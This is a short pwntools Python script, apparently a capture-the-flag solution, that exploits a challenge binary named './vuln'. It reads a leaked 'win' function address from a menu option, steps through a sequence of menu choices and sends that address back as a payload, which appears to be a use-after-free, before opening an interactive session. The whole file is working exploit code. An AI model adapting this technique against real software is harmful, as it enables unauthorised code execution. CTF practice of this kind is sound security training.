from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe], *a, **kw)

exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

sh = start()

sh.sendlineafter(b'(e)xit', b'S')
sh.recvuntil(b'OOP! Memory leak...')
get = int(sh.recvline(), 16)
info('Leaked win addr: %#0x', get)

p = flat([
    get
])

sh.sendlineafter(b't', b'M')
sh.sendlineafter(b'Enter your username:', b'AAAAAAAA')
sh.sendlineafter(b't', b'I')
sh.sendlineafter(b'?', b'Y')

sh.sendlineafter(b't', b'L')
sh.sendlineafter(b':', p)

sh.interactive()
